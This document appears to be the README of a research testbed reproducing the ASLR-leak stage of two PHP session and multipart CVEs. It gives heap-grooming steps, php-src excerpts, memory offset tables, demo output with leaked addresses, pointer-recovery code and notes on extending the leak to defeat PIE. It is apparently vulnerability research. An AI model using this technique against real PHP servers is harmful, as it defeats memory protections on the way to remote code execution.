# php2leak: zero-code remote ASLR leak (heap)

Full article about php2shell available [here](https://dguerri.github.io/random-tech-stuff/posts/anatomy-of-php2shell-cve-2026-109618-and-cve-2026-109619/)

A Docker testbed that reproduces the **application-agnostic ASLR-leak stage** of
CVE-2026-109618 / CVE-2026-109619 on a vulnerable **PHP 8.4.26 + Apache
`mod_php` (prefork)** build, and **leaks the Zend MM heap base (an
ASLR-randomized address) over HTTP** from a second container with **pwntools**.

No userland PHP code or reflection is needed: `target/index.php` is just
`<?php echo "ok\n";` (no `session_start()`, no `SID`, no user input handling).
All 262 leaked heap bytes are emitted by PHP itself in the
`Set-Cookie: PHPSESSID=` HTTP response header.

> All `php-src` references are kept inline as comments.

---

```text
❯ ./demo_aslr.sh
== run 1 ==
  [leak]
    [*] Set-Cookie leaked 262 raw heap bytes (first 16B: 70d8a517627f00000601000000000000)
    [*] heap ptr = 0x00007f6217a5d870
    [+] Zend MM chunk base (ASLR): 0x00007f6217a00000
  [ground truth] debug.php
    7f6217a00000-7f6217c00000  [anon:zend_alloc]
    7f6217c4a000-7f6217da0000  /usr/lib/apache2/modules/libphp.so
    7f6217da0000-7f62182a3000  /usr/lib/apache2/modules/libphp.so
    7f62182a3000-7f6218da8000  /usr/lib/apache2/modules/libphp.so
    7f6218da8000-7f6218e81000  /usr/lib/apache2/modules/libphp.so
    7f6218e81000-7f6218f4b000  /usr/lib/apache2/modules/libphp.so
== run 2 (restart -> ASLR) ==
  [leak]
    [*] Set-Cookie leaked 262 raw heap bytes (first 16B: 70d885c1d67800000601000000000000)
    [*] heap ptr = 0x000078d6c185d870
    [+] Zend MM chunk base (ASLR): 0x000078d6c1800000
  [ground truth] debug.php
    78d6c1800000-78d6c1a00000  [anon:zend_alloc]
    78d6c1a0a000-78d6c1b60000  /usr/lib/apache2/modules/libphp.so
    78d6c1b60000-78d6c2063000  /usr/lib/apache2/modules/libphp.so
    78d6c2063000-78d6c2b68000  /usr/lib/apache2/modules/libphp.so
    78d6c2b68000-78d6c2c41000  /usr/lib/apache2/modules/libphp.so
    78d6c2c41000-78d6c2d0b000  /usr/lib/apache2/modules/libphp.so
```

## How it works

Both CVEs meet at `php_request_startup()`: a `multipart/form-data` body is
parsed **before** any module `RINIT` or application code runs (`main/main.c`):

```c
php_hash_environment();     /* PRE-RINIT: parse multipart, fire session
                             *   upload-progress callback                    */
zend_activate_modules();    /* RINIT runs *after* the POST body              */
PG(modules_activated) = 1;
```

The worker is a persistent prefork child, so its ASLR layout and `.bss` module
globals (`PS(id)`, `PS(send_cookie)`, `PS(mod_data)`, `PS(http_session_vars)`)
stay fixed across requests on the same PID. Both requests go over **one HTTP/1.1
keep-alive connection**, which prefork MPM serves from the same child without
any worker-pinning config.

| Step | Request | What happens (source) |
| :--- | :--- | :--- |
| **Arm** | 1 | Pre-stashes small-bin slots in `heap->main_chunk`, exhausts all remaining 4 KB pages across all 64 chunks (`128 MB`) via 846 `filename=""` empty-upload parts + LRUN mops, releases the `main_chunk` slots onto Zend MM's LIFO `free_slot[]` heads, then sends `PHP_SESSION_UPLOAD_PROGRESS` + `PHPSESSID="\x00"` + a file part (`MULTIPART_EVENT_FILE_START`). `s_create_sid()` allocates `PS(id)` in `main_chunk` and sets `PS(send_cookie) = 1`, and `_zend_bailout()` fires inside `php_session_send_cookie()` before `PS(send_cookie) = 0` or `s_close` can run |
| **Leak** | 2 | Sends `d0[0..63]="V"*50` + upload-progress + `PHPSESSID="Z"` (no file part, so `FILE_START` does not reset `PS(id)`). `d0`'s `arPacked` buffer reclaims `PS(id)`'s page, `ps_open_files()` cleanly closes the intact `PS(mod_data)` slot, and `php_session_send_cookie()` URL-encodes 262 raw heap bytes into `Set-Cookie: PHPSESSID=` |

### Why `Set-Cookie: PHPSESSID=` works without userland code

At first glance, `MULTIPART_EVENT_FILE_START` appears to silence `Set-Cookie:`
by setting `PS(send_cookie) = 0` before calling `php_session_rfc1867_update()`.
Passing `PHPSESSID="\x00"` (length 1 so `FORMDATA` captures it, yet NUL-prefixed)
triggers session ID regeneration inside `php_session_initialize()`
(`ext/session/session.c`):

```c
PS(mod)->s_open(&PS(mod_data), ...);             /* ps_files (40B Bin #4)    */
if (!PS(id) || !ZSTR_VAL(PS(id))[0]) {
    if (PS(id)) {
        zend_string_release_ex(PS(id), 0);
        PS(id) = NULL;
    }
    PS(id) = PS(mod)->s_create_sid(&PS(mod_data)); /* 64B Bin #7 in main_chunk */
    if (PS(use_cookies)) {
        PS(send_cookie) = 1;                     /* flips send_cookie ON!    */
    }
}
/* Immediately calls php_session_reset_id(): */
if (PS(use_cookies) && PS(send_cookie)) {
    zend_result cookies_sent = php_session_send_cookie(); /* <-- OOM here!   */
    if (UNEXPECTED(cookies_sent == FAILURE)) {
        return FAILURE;
    }
    PS(send_cookie) = 0;                         /* <-- skipped on bailout!  */
}
```

Leaving one free 256-byte Bin `#15` slot before `UPLOAD_PROGRESS` (consumed by
`progress->key`) causes `php_session_send_cookie()`'s `smart_str` allocation
(256 B, Bin `#15`) to request a new 4 KB page at `memory_limit` and bail out:

1. **Keeping `PS(mod_data)` intact:** Because `php_session_flush(1)` (`s_close`)
   is also skipped on Request 1, `PS(mod_data)` (`ps_files *`, 40 B Bin `#4`)
   and `data->basedir` (`"/tmp"`, 32 B Bin `#3`) remain non-NULL in `.bss`.
   Request 1 pins both inside `heap->main_chunk` and places `PS(mod_data)` at
   page `0x57 + 0x410` (safely between Bin `#6` slot 18's `next_free_slot` at
   `+0x3f0` and shadow pointer at `+0x420` on Request 2), so `ps_open_files()`
   -> `ps_close_files()` closes them cleanly before `Set-Cookie` is emitted.
2. **Overlaying `PS(id)` with `arPacked`:** Because `shutdown_memory_manager()`
   reset `heap->main_chunk`'s page bitmaps on Request 1 bailout, `PS(id)`'s page
   (`page 0x6f + 0x140`) is reclaimed in Request 2 by `d0[0..63]`'s packed array
   (`8`-byte `HT_MIN_MASK` prefix + `64 * 16`-byte `zval`s = `1032 B`, Bin `#24`):

```text
Offset at PS(id)   Read as zend_string       Written by d0's arPacked buffer
+0x00..+0x07       gc (8 B)               <- d0[18].u1 = 0x0106
+0x08..+0x0f       h  (8 B)               <- d0[19].value.str (ptr to "V"*50)
+0x10..+0x17       len (8 B)              <- d0[19].u1 = 0x0106 (IS_STRING_EX), u2 = 0
                                               ==> ZSTR_LEN(PS(id)) = 262 bytes!
+0x18..+0x1f       val[0..7]              <- d0[20].value.str (8-byte HEAP PTR!)
+0x20..+0x11d      val[8..261]            <- d0[20..36]
```

`php_session_send_cookie()` passes `ZSTR_VAL(PS(id))` and `ZSTR_LEN(PS(id))`
(`262`) to `php_url_encode()`, emitting all 8 bytes of the heap pointer (including
its `\x00\x00` high bytes as `%00%00`):

```text
Set-Cookie: PHPSESSID=p%D8%A5%17b%7F%00%00%06%01%00%00%00%00%00%00...; path=/
```

Unquoting the first 8 bytes recovers the full 64-bit heap pointer and the
2 MB-aligned `main_chunk` base:

```python
raw        = urllib.parse.unquote_to_bytes(cookie_val)
ptr        = struct.unpack_from("<Q", raw, 0)[0]   # 0x00007f6217a5d870
chunk_base = ptr & ~0x1fffff                       # 0x00007f6217a00000
```

---

## Layout

```text
php2leak/
├── docker-compose.yml
├── demo_aslr.sh                # leak, twice (restart -> ASLR)
├── target/
│   ├── Dockerfile              # php:8.4.26-apache-bookworm (stock prefork MPM)
│   ├── php.ini                 # no overrides (fully default PHP config)
│   ├── index.php               # inert `<?php echo "ok\n";` (zero reflection)
│   └── debug.php               # ground-truth addresses (/proc/self/maps)
└── attacker/
    ├── Dockerfile              # python:3.12 + pwntools
    └── leak.py                 # 2-request Set-Cookie leak + chunk-base recovery
```

---

## Build & run

```bash
docker compose build                  # build images (or `docker-compose build`)
docker compose up -d target           # start vulnerable target

./demo_aslr.sh                        # end-to-end leak, twice (restart -> ASLR)

# or a single run:
docker compose run --rm attacker
```

---

## Notes

- **PIE (`libphp.so`) leak:** the same `PS(id)` read primitive also defeats PIE
  without userland objects. Every Pre-RINIT 56-byte `HashTable` (nested `$_POST`
  sub-array, Bin `#6`) stores `&zval_ptr_dtor` at `ht->pDestructor` (`+0x30`),
  pointing directly into `libphp.so` `.text` (and any residual `zend_object`
  stores `&std_object_handlers` at `+0x18`).
- **Default-config OOM:** the amplifier uses Calif's empty-upload trick:
  `filename=""` parts are not counted toward `max_file_uploads`, but each still
  builds the six `$_FILES` entries (`name`, `full_path`, `type`, `tmp_name`,
  `error`, `size`) under the nested name, giving ~6x amplification while staying
  under `max_input_vars=1000`, `max_input_nesting_level=64`, and
  `post_max_size=8M`.
- **Heap alignment:** the OOM window and reclaim offsets depend on the exact
  allocation sequence (boundary string, field names, value lengths). The
  constants in `leak.py` are tuned for `php:8.4.26-apache-bookworm`; a different
  PHP version or SAPI build requires re-tuning.

## Cleanup

```bash
docker compose down -v
```
